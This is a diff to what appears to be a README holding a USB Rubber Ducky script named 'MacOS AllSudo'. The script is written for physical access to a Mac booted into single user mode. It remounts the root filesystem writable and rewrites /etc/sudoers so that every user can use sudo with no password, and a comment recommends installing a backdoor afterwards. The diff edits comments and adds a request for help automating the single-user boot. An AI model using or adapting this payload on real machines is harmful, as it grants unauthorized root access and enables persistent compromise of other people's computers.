@@ -13,7 +13,6 @@ This method was tested on macOS 10.7.5, 10.11, 10.12 but should work for all ver
 REM MacOS AllSudo
 REM Enables Sudo access for all users without a password
 REM First boot the machine into single user mode - https://support.apple.com/en-us/HT201573
-REM (You could probably script single user mode but I couldn't be bothered to play with the timings)
 REM By Jesse Wallace (@c0deous)
 REM https://c0deo.us/
 DELAY 1000
@@ -21,3 +20,6 @@ STRING mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD:
 ENTER
 REM Now would be a great time to install a backdoor.  Ez root ;3
 REM TODO Use visudo for edits (unconfirmed if working)
+```
+
+**Todo**: Having issues scripting a way to boot into single user mode with the duck.  If you'd like to help please DM me on Twitter (@c0deous)
